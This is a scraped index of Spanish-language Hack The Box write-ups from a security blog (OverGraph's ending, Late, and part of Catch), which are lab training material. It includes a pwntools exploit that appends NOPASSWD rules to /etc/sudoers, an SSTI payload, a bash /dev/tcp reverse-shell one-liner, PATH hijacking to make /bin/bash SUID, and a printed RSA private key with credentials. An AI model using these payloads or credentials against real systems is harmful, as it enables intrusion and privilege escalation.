Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3fd000) RUNPATH: b'./libc' [+] Opening connection to 127.0.0.1 on port 9851: Done [*] Closed connection to 127.0.0.1 port 9851  Y vemos que /bin/bash es ahora SUID, por lo que podemos ejecutar Bash como root:\nuser@overgraph:/usr/local/bin/Nreport$ ls -l /bin/bash -rwsr-xr-x 1 root root 1183448 Apr 18 09:14 /bin/bash user@overgraph:/usr/local/bin/Nreport$ bash -p bash-5.0# cat /root/root.txt 413a25bd4e358c7863dd13455c053247  Solo por diversión, otra opción es modificar la ruta /opt/crv1/ + \u0026lt;username\u0026gt; para que sea /etc/passwd, /etc/sudoers o /root/.ssh/authorized_keys y añadir los datos necesarios para escalar privilegios usando la función report:\nvoidreport() { longin_FS_OFFSET; intoption; intindex; inti; FILE *fp; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); fp =fopen(userinfo1 +0x8c, \"a\"); puts(\"1.Report Specific Message\"); puts(\"2.Report All Messages\"); printf(\"\u0026gt; \"); __isoc99_scanf(\"%d\", \u0026amp;option); if(option ==1) { printf(\"Index: \"); __isoc99_scanf(\"%d\", \u0026amp;index); if(Arryindex \u0026lt;index) { printf(\"Invalid Index\"); } fprintf(fp,\"%s\", *(long*) (message_array +(long) index *8) +0x3c); fprintf(fp,\"%s\\n\", *(undefined8 *) (message_array +(long) index *8)); printf(\"File stored At: %s\\n\", 0x40420c); } elseif(option ==2) { for(i =0; i \u0026lt;Arryindex; i =i +1) { fprintf(fp,\"%s\", *(long*) (message_array +(long) i *8) +0x3c); fprintf(fp,\"%s\\n\", *(undefined8 *) (message_array +(long) i *8)); } printf(\"File stored At: %s\\n\", 0x40420c); } else{ puts(\"Invalid Option\"); } fclose(fp); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  Básicamente, esta función escribe nuestros mensajes en un archivo /opt/crv1/ + \u0026lt;username\u0026gt; (como root).\nAntes de descubrir la vulnerabilidad de edit, pensé que se podrían introducir varios ../ en el usuario y hacer que el programa escribiera en /opt/crv1/../../etc/sudoers (o cualquier otro archivo). Pero no funciona porque /opt/crv1 no existe:\nuser@overgraph:/usr/local/bin/Nreport$ ls -la /opt total 16 drwxr-xr-x 3 root root 4096 Apr 12 17:38 . drwxr-xr-x 18 root root 4096 Apr 12 17:38 .. -rw-r--r-- 1 root root 168 Apr 8 18:39 conv.sh drwxr-xr-x 3 root root 4096 Apr 12 17:38 google  Usando la primitiva write-what-where, podemos modificar la ruta para que sea /etc/sudoers y luego añadir user ALL=NOPASSWD:ALL (nótese que el archivo se abre en modo \u0026quot;a\u0026quot;, que significa añadir, append).\nLa dirección de la ruta es userinfo1 + 140 (0x404180 + 140 = 0x40420c). Aquí hay un problema, porque \\x0c se considera carácter de salto de línea por fgets (de hecho, \\x0a, \\x0b, \\x0c y \\x0d), por lo que no funcionará. Para evitar esto, podemos escribir en 0x40420e usando pt/../etc/sudoers, de manera que la ruta quede como /opt/../etc/sudoers.\nLa manera en la que los datos se escriben es \u0026lt;message\u0026gt; \u0026lt;message-title\u0026gt;, por lo que podemos aprovecharnos del espacio en blanco y separar user y ALL=NOPASSWD:ALL en nuestro payload.\nEste será el código del exploit para escribir en /etc/sudoers (exploit_write.py):\n#!/usr/bin/env python3 frompwnimportcontext, log, p64, remote, sys context.binary='nreport_patched' defmain(): token=b'hD]AAAAAAVAAAT' iflen(sys.argv) !=3: log.error(f'Usage: python3 {sys.argv[0]}\u0026lt;ip\u0026gt; \u0026lt;port\u0026gt;') host, port=sys.argv[1], sys.argv[2] p=remote(host, int(port)) p.sendlineafter(b'Enter Your Token: ', token) p.sendlineafter(b'Enter Name: ', p64(context.binary.sym.userinfo1 +140+2)) p.sendlineafter(b'\u0026gt; ', b'1') p.sendlineafter(b'Message Title: ', b'ALL=NOPASSWD:ALL') p.sendlineafter(b'Message: ', b'user') p.sendlineafter(b'\u0026gt; ', b'3') p.sendlineafter(b'Enter number to edit: ', b'12') p.sendlineafter(b'Message Title: ', b'pt/../etc/sudoers') p.sendlineafter(b'\u0026gt; ', b'4') p.sendlineafter(b'\u0026gt; ', b'2') p.close() if__name__=='__main__': main()  user@overgraph:/usr/local/bin/Nreport$ ls -l --time-style=+ /etc/sudoers -r--r----- 1 root root 755 /etc/sudoers user@overgraph:/usr/local/bin/Nreport$ sudo -l [sudo] password for user:  $ python3 exploit_write.py 127.0.0.1 9851 [*] './nreport_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3fd000) RUNPATH: b'./libc' [+] Opening connection to 127.0.0.1 on port 9851: Done [*] Closed connection to 127.0.0.1 port 9851  Y con esto, tenemos permisos de sudo sin proporcionar contraseña:\nuser@overgraph:/usr/local/bin/Nreport$ ls -l --time-style=+ /etc/sudoers -r--r----- 1 root root 777 /etc/sudoers user@overgraph:/usr/local/bin/Nreport$ sudo -l Matching Defaults entries for user on overgraph: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on overgraph: (root) NOPASSWD: ALL user@overgraph:/usr/local/bin/Nreport$ sudo su root@overgraph:/usr/local/bin/Nreport# cat /root/root.txt 413a25bd4e358c7863dd13455c053247  ","image":"/images/HTB/OverGraph/OverGraph.png","permalink":"https://7rocky.github.io/htb/overgraph/","section":"htb","summary":"Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web que es vulnerable a Open Redirect, una aplicación web hecha en AngularJS vulnerable a Client-Side Template Injection y XSS, y una implementación de GraphQL. Somos capaces de registrar una nueva cuenta al saltarnos un código OTP mediante una inyección NoSQL. Luego, podemos realizar un ataque de CSRF abusando del Open Redirect para inyectar un payload de XSS en el perfil de la víctima para obtener su adminToken, que está guardado en localStorage. Después, podemos subir archivos de video que serán procesados por ffmpeg y explotar un Server-Side Request Forgery que nos permite leer archivos del servidor. Finalmente, ganaremos acceso a la máquina como un usuario y podemos encontrar un binario está en ejecución como root. Después de analizarlo, podemos obtener un token válido para usar el programa y exploitar una vulnerabilidad para escribir datos arbitrarios en una dirección arbitraria, derivando en RCE o permisos de lectura como root","time":24,"title":"OverGraph"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.156   Fecha: 23 / 04 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.156 -p 22,80 Nmap scan report for 10.10.11.156 Host is up (0.054s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA) | 256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA) |_ 256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Late - Best online image tools Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.25 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración Si vamos a http://10.10.11.156, veremos una página web que habla de fotos:\nEn el pie de página, se ve support@late.htb, lo cual indica que puede haber virtual hosts configurados. Vamos a usar ffuf para enumerar subdominios:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.156 -H 'Host: FUZZ.late.htb' -fw 828 images [Status: 200, Size: 2187, Words: 448, Lines: 64, Duration: 302ms]  Ahora, podemos poner images.late.htb en /etc/hosts y acceder:\nSe trata de una aplicación web montada en Flask (un framework web de Python) que toma una imagen y extrae el texto contenido. Vamos a probar esta funcionalidad con la siguiente imagen (tomada como una captura de pantalla de la terminal):\nEl servidor automáticamente nos descarga un archivo results.txt. Vamos a usar curl mejor:\n$ curl images.late.htb/scanner -F file=@Late-test-image.png \u0026lt;p\u0026gt;Test \u0026lt;/p\u0026gt;  Acceso a la máquina Esto es interesante, está renderizando el texto en la respuesta HTML. Como está ejecutando Flask, podemos probar Server-Side Template Injection (SSTI) en Jinja2 (el motor de plantillas por defecto de Flask):\n$ curl images.late.htb/scanner -F file=@Late-test-ssti.png \u0026lt;p\u0026gt;49 \u0026lt;/p\u0026gt;  Y muestra 49 (7*7); por tanto, es vulnerable.\nExplotación de SSTI Vamos a conseguir ejecución remota de comandos con el siguiente payload de PayloadsAllTheThings:\n{{ cycler.__init__.__globals__.os.popen('id').read() }}  En lugar de id, queremos una reverse shell en el sistema.\nEsta vez, no codificaré el comando en Base64 porque la aplicación web puede fallar al extraer el texto. En cambio, puedo hacer que el servidor realice una petición GET a mi máquina para descargar un archivo index.html que contenga el comando de reverse shell e interpretarlo con Bash:\n$ vim index.html $ cat index.html #!/bin/bash bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261 $ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ...  Ahora que está todo preparado, enviamos la imagen:\n$ curl images.late.htb/scanner -F file=@Late-rce-ssti.png  Recibimos la petición GET para el index.html:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.156 - - [] \"GET / HTTP/1.1\" 200 -  Y nos llega la reverse shell a nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.156. Ncat: Connection from 10.10.11.156:54444. bash: cannot set terminal process group (1206): Inappropriate ioctl for device bash: no job control in this shell svc_acc@late:~/app$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null svc_acc@late:~/app$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm svc_acc@late:~/app$ export TERM=xterm svc_acc@late:~/app$ export SHELL=bash svc_acc@late:~/app$ stty rows 50 columns 158  En este punto, podemos leer la flag user.txt:\nsvc_acc@late:~/app$ cd svc_acc@late:~$ cat user.txt 3a121d4b78598d9e1d214af6647f1027  Enumeración del sistema Somos usuario svc_acc. Vamos a buscar qué archivos y directorios pertenecen a svc_acc:\nsvc_acc@late:~$ find / -user svc_acc 2/dev/null | grep -vE 'proc|sys|run|home' /usr/local/sbin /usr/local/sbin/ssh-alert.sh /dev/pts/0  Hay un script en Bash:\nsvc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh  #!/bin/bash RECIPIENT=\"root@late.htb\" SUBJECT=\"Email from Server Login: SSH Alert\" BODY=\" A SSH login was detected. User: $PAM_USER User IP Host: $PAM_RHOST Service: $PAM_SERVICE TTY: $PAM_TTY Date: `date` Server: `uname -a` \" if [ ${PAM_TYPE} = \"open_session\" ]; then echo \"Subject:${SUBJECT} ${BODY}\" | /usr/sbin/sendmail ${RECIPIENT} fi  Parece que está relacionado con los inicios de sesión por SSH: Vamos a ver si hay algún otro archivo que referencie a ssh-alert.sh:\nsvc_acc@late:~$ grep -r ssh-alert.sh / 2/dev/null /etc/pam.d/sshd:session required pam_exec.so /usr/local/sbin/ssh-alert.sh ^C  Hay un PAM (Pluggable Authentication Module) que utiliza ssh-alert.sh.\nNos damos cuenta de que el script está guardado en /usr/local/sbin, y la variable PATH tiene este directorio el primero:\nsvc_acc@late:~$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  Además, somos capaces de escribir en /usr/local/sbin porque este directorio nos pertenece:\nsvc_acc@late:~$ ls -l --time-style=+ /usr/local total 32 drwxr-xr-x 2 root root 4096 bin drwxr-xr-x 2 root root 4096 etc drwxr-xr-x 2 root root 4096 games drwxr-xr-x 2 root root 4096 include drwxr-xr-x 4 root root 4096 lib lrwxrwxrwx 1 root root 9 man -\u0026gt; share/man drwxr-xr-x 2 svc_acc svc_acc 4096 sbin drwxr-xr-x 7 root root 4096 share drwxr-xr-x 2 root root 4096 src  Escalada de privilegios El script en Bash anterior está ejecutando comandos sin especificar la ruta absoluta, por lo que seremos capaces de crear archivos ejecutables que sobrescriban a los legítimos. Por ejemplo, uname.\nLa ruta absoluta normal para uname es:\nsvc_acc@late:~$ which uname /bin/uname  Pero vamos a crear un nuevo archivo ejecutable uname que active el privilegio SUID a /bin/bash:\nsvc_acc@late:~$ cat \u0026gt; /usr/local/sbin/uname #!/bin/bash chmod 4755 /bin/bash ^C svc_acc@late:~$ chmod +x /usr/local/sbin/uname  Como el uname malicioso está en /usr/local/sbin y este directorio está primero en la variable de entorno PATH, el comando uname será el nuestro:\nsvc_acc@late:~$ which uname /usr/local/sbin/uname  Podemos tratar de acceder por SSH y probar con contraseñas aleatorios, pero el script ssh-alert.sh no se ejecuta, y por tanto, /bin/bash no es SUID aún.\nPor tanto, podemos deducir que necesitamos iniciar sesión correctamente. Para ello, vemos que svc_acc tiene un directorio .ssh:\nsvc_acc@late:~$ ls -la total 40 drwxr-xr-x 7 svc_acc svc_acc 4096 Apr 7 13:51 . drwxr-xr-x 3 root root 4096 Jan 5 10:44 .. drwxrwxr-x 7 svc_acc svc_acc 4096 Apr 4 13:28 app lrwxrwxrwx 1 svc_acc svc_acc 9 Jan 16 18:45 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 svc_acc svc_acc 3771 Apr 4 2018 .bashrc drwx------ 3 svc_acc svc_acc 4096 Apr 7 13:51 .cache drwx------ 3 svc_acc svc_acc 4096 Jan 5 10:45 .gnupg drwxrwxr-x 5 svc_acc svc_acc 4096 Jan 5 12:13 .local -rw-r--r-- 1 svc_acc svc_acc 807 Apr 4 2018 .profile drwx------ 2 svc_acc svc_acc 4096 Apr 7 11:08 .ssh -rw-r----- 1 root svc_acc 33 Apr 21 11:24 user.txt  Además, tiene una clave privada de SSH:\nsvc_acc@late:~$ cat .ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi /mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7 d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7 7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0 ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7 t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq 0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y 3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+ Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0 kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw== -----END RSA PRIVATE KEY-----  Podemos copiarla a nuestra máquina y conectarnos por SSH sin proporcionar contraseña y veremos que /bin/bash es ahora SUID:\n$ vim id_rsa $ chmod 600 id_rsa $ ssh -i id_rsa svc_acc@late.htb -bash-4.4$ source ~/.bashrc svc_acc@late:~$ ls -l /bin/bash -rwsr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash  Finalmente, ejecutamos bash -p para decirle a Bash que use el privilegio SUID y ya somos root:\nsvc_acc@late:~$ bash -p bash-4.4# cat /root/root.txt c54e75a791e86353a647700ab1878431  ","image":"/images/HTB/Late/Late.png","permalink":"https://7rocky.github.io/htb/late/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina contiene una aplicación web en Flask que extrae texto de imágenes y lo renderiza, siendo vulnerable a SSTI. Luego, existe un PAM configurado para SSH con rutas relativas, que puede ser abusado debido a ciertos privilegios para sobrescribir ejecutables. Para comprometer esta máquina se necesitan conocimientos básicos de explotación web y de enumeración en Linux","time":5,"title":"Late"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.150   Fecha: 12 / 03 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.150 -p 22,80,3000,5000,8000 Nmap scan report for 10.10.11.150 Host is up (0.086s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Catch Global Systems 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/html; charset=UTF-8 | Set-Cookie: i_like_gitea=c4add8273ad10169; Path=/; HttpOnly | Set-Cookie: _csrf=mnsU0O5Ra5DDvk5hMde46oeBYXA6MTY1ODE3MDcyNzUxMDc4MTQ0Mg; Path=/; Expires=Tue, 19 Jul 2022 18:58:47 GMT; HttpOnly; SameSite=Lax | Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\"en-US\" class=\"theme-\"\u0026gt; | \u0026lt;head data-suburl=\"\"\u0026gt; | \u0026lt;meta charset=\"utf-8\"\u0026gt; | \u0026lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u0026gt; | \u0026lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"\u0026gt; | \u0026lt;title\u0026gt; Catch Repositories \u0026lt;/title\u0026gt; | \u0026lt;link rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Set-Cookie: i_like_gitea=a52174aa7176ecac; Path=/; HttpOnly | Set-Cookie: _csrf=HmeoQlGnj2FP7rgeJT-YACIGwbk6MTY1ODE3MDczMzE2MjUyNDQ4Ng; Path=/; Expires=Tue, 19 Jul 2022 18:58:53 GMT; HttpOnly; SameSite=Lax | Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: Mon, 18 Jul 2022 18:58:53 GMT |_ Content-Length: 0 5000/tcp open upnp? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest: | HTTP/1.1 302 Found | X-Frame-Options: SAMEORIGIN | X-Download-Options: noopen | X-Content-Type-Options: nosniff | X-XSS-Protection: 1; mode=block | Content-Security-Policy: | X-Content-Security-Policy: | X-WebKit-CSP: | X-UA-Compatible: IE=Edge,chrome=1 | Location: /login | Vary: Accept, Accept-Encoding | Content-Type: text/plain; charset=utf-8 | Content-Length: 28 | Set-Cookie: connect.sid=s%3AJOtQ3i7EmG91-WEf4EQIm57CDg8l6Qvt.wqsCV4JfUvlp54pre9ayq1zvMjJdCQVYMGfc%2BBkKKPA; Path=/; HttpOnly | Date: | Connection: close | Found. Redirecting to /login | HTTPOptions: | HTTP/1.1 200 OK | X-Frame-Options: SAMEORIGIN | X-Download-Options: noopen | X-Content-Type-Options: nosniff | X-XSS-Protection: 1; mode=block | Content-Security-Policy: | X-Content-Security-Policy: | X-WebKit-CSP: | X-UA-Compatible: IE=Edge,chrome=1 | Allow: GET,HEAD | Content-Type: text/html; charset=utf-8 | Content-Length: 8 | ETag: W/\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\" | Set-Cookie: connect.sid=s%3AMV6FPc2fj8xR1N8MB0sdWFGVlKpMTVRw.Nfg63NvC%2FRxP6po46sBGOZ1w2DhldLydbieGNTsj8VE; Path=/; HttpOnly | Vary: Accept-Encoding | Date: | Connection: close |_ GET,HEAD 8000/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Catch Global Systems Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 97.06 seconds  La máquina tiene abiertos los puertos 22 (SSH), 80, 3000, 5000 y 8000 (HTTP).\nEnumeración Si vamos a http://10.10.11.150, veremos esta página web:\nAnálisis de APK Aquí podemos descargar un archivo APK llamado catchv1.0.apk. Vamos a arrancar MobSF para subir el archivo APK:\nSe puede observar un subdominio: status.catch.htb, pero contiene la misma página que arriba.\nMirando las cadenas de caracteres, vemos tres tokens de autenticación:\nA lo mejor nos podemos autenticar a algún servicio con estos tokens.\nEnumeración web De hecho, http://10.10.11.150:3000 muestra una instancia de Gitea:\nLuego, http://10.10.11.150:5000 tiene Let\u0026rsquo;s Chat:\nY finalmente http://10.10.11.150:8000 contiene un Cachet:\nEnumeración de API Después de investigar, veremos que Let\u0026rsquo;s Chat tiene una API disponible con los siguientes recursos (más información en github.com):\nUsando lets_chat_token en la cabecera de petición Authorization, podremos leer información de las salas de Let\u0026rsquo;s Chat:\n$ token='NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' $ curl 10.10.11.150:5000/rooms -sH \"Authorization: Bearer $token\" | jq [ { \"id\": \"61b86b28d984e2451036eb17\", \"slug\": \"status\", \"name\": \"Status\", \"description\": \"Cachet Updates and Maintenance\", \"lastActive\": \"2021-12-14T10:34:20.749Z\", \"created\": \"2021-12-14T10:00:08.384Z\", \"owner\": \"61b86aead984e2451036eb16\", \"private\": false, \"hasPassword\": false, \"participants\": [] }, { \"id\": \"61b8708efe190b466d476bfb\", \"slug\": \"android_dev\", \"name\": \"Android Development\", \"description\": \"Android App Updates, Issues \u0026 More\", \"lastActive\": \"2021-12-14T10:24:21.145Z\", \"created\": \"2021-12-14T10:23:10.474Z\", \"owner\": \"61b86aead984e2451036eb16\", \"private\": false, \"hasPassword\": false, \"participants\": [] }, { \"id\": \"61b86b3fd984e2451036eb18\", \"slug\": \"employees\", \"name\": \"Employees\", \"description\": \"New Joinees, Org updates\", \"lastActive\": \"2021-12-14T10:18:04.710Z\", \"created\": \"2021-12-14T10:00:31.043Z\", \"owner\": \"61b86aead984e2451036eb16\", \"private\": false, \"hasPassword\": false, \"participants\": [] } ]  Para extraer los identificadores de sala emplearé gron:\n$ curl 10.10.11.150:5000/rooms -sH \"Authorization: Bearer $token\" | gron | grep '\\.id' | norg [ { \"id\": \"61b86b28d984e2451036eb17\" }, { \"id\": \"61b8708efe190b466d476bfb\" }, { \"id\": \"61b86b3fd984e2451036eb18\" } ]  Acceso a la máquina Con el ID de sala, podemos obtener todos los mensajes y sacar su contenido (clave text):\n$ curl 10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages -sH \"Authorization: Bearer $token\" | gron | grep text | norg [ { \"text\": \"ah sure!\" }, { \"text\": \"You should actually include this task to your list as well as a part of quarterly audit\" }, { \"text\": \"Also make sure we've our systems, applications and databases up-to-date.\" }, { \"text\": \"Excellent! \" }, { \"text\": \"Why not. We've this in our todo list for next quarter\" }, { \"text\": \"@john is it possible to add SSL to our status domain to make sure everything is secure ? \" }, { \"text\": \"Here are the credentials `john : E}V!mywu_69T4C}W`\" }, { \"text\": \"Sure one sec.\" }, { \"text\": \"Can you create an account for me ? \" }, { \"text\": \"Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. \" } ]  Reutilización de contraseñas en Cachet Y ahí tenemos la contraseña de john: E}V!mywu_69T4C}W. Si probamos las credenciales en otros servicios, descubriremos que son válidas para Cachet (http://10.10.11.150:8000):\nSi vamos a \u0026ldquo;Settings\u0026rdquo;, veremos que está ejecutándose Cachet versión 2.4.0-dev:\nEn este punto, podemos buscar vulnerabilidades que afecten a esta versión. De hecho, hay tres: CVE-2021-39172, CVE-2021-39173 y CVE-2021-39174. Estas tres se explican de forma detallada en blog.sonarsource.com.\nExplotación de CVE Podemos explotar la última, que consiste en fugar información de variables de entorno (cargadas en un archivo .env) con la sintaxis ${NAME} en la configuración del correo (Server-Side Template Injection). Después de poner ${DB_USERNAME} y ${DB_PASSWORD} (como se muestra en blog.sonarsource.com), obtendremos un usuario (will) y una contraseña (s2#4Fg0_%3!):\nSorprendentemente, estas credenciales son válidas para conectarnos a la máquina mediante SSH, y podemos ver la flag user.txt:\n$ ssh will@10.10.11.150 will@10.10.11.150's password: will@catch:~$ cat user.txt 6b9bf0acbbabd8de17ed0af217914b47  Enumeración del sistema Después de hacer la enumeración básica, podemos enumerar procesos con pspy y ver un script ejecutado por root de forma periódica:\nCMD: UID=0 PID=30203 | /bin/bash /opt/mdm/verify.sh CMD: UID=0 PID=30208 | openssl rand -hex 12 CMD: UID=0 PID=30209 | mv /opt/mdm/apk_bin/*.apk /root/mdm/apk_bin/7b5167a7e62e3fdbaea84162.apk CMD: UID=0 PID=30210 | jarsigner -verify /root/mdm/apk_bin/7b5167a7e62e3fdbaea84162.apk CMD: UID=0 PID=30230 | /bin/bash /opt/mdm/verify.sh CMD: UID=0 PID=30233 | grep -v verify.sh CMD: UID=0 PID=30232 | grep -v apk_bin CMD: UID=0 PID=30231 | ls -A /opt/mdm CMD: UID=0 PID=30237 | /usr/sbin/CRON -f CMD: UID=0 PID=30236 | /usr/sbin/CRON -f CMD: UID=0 PID=30239 | /bin/sh -c rm -rf /root/mdm/certified_apps/* CMD: UID=0 PID=30238 | /bin/sh -c rm -rf /root/mdm/certified_apps/* CMD: UID=0 PID=30240 | CMD: UID=0 PID=30241 | /bin/bash /opt/mdm/verify.sh CMD: UID=0 PID=30247 | jarsigner -verify /root/mdm/apk_bin/bf97a421280379d4c67f58ca.apk  Vamos a analizar el código fuente de /opt/mdm/verify.sh, que es un script en Bash:\n#!/bin/bash ################### # Signature Check # ################### sig_check() { jarsigner -verify \"$1/$2\"2\u0026gt;/dev/null \u0026gt;/dev/null if[[ $? -eq0 ]];then echo'[+] Signature Check Passed' else echo'[!] Signature Check Failed. Invalid Certificate.' cleanup exit fi } ####################### # Compatibility Check # ####################### comp_check() { apktool d -s \"$1/$2\"-o $3 2\u0026gt;/dev/null \u0026gt;/dev/null COMPILE_SDK_VER=$(grep -oPm1 \"(?\u0026lt;=compileSdkVersion=\\\")[^\\\"]+\" \"$PROCESS_BIN/AndroidManifest.xml\") if[ -z\"$COMPILE_SDK_VER\"];then echo'[!] Failed to find target SDK version.' cleanup exit else if[ $COMPILE_SDK_VER -lt18 ];then echo\"[!] APK 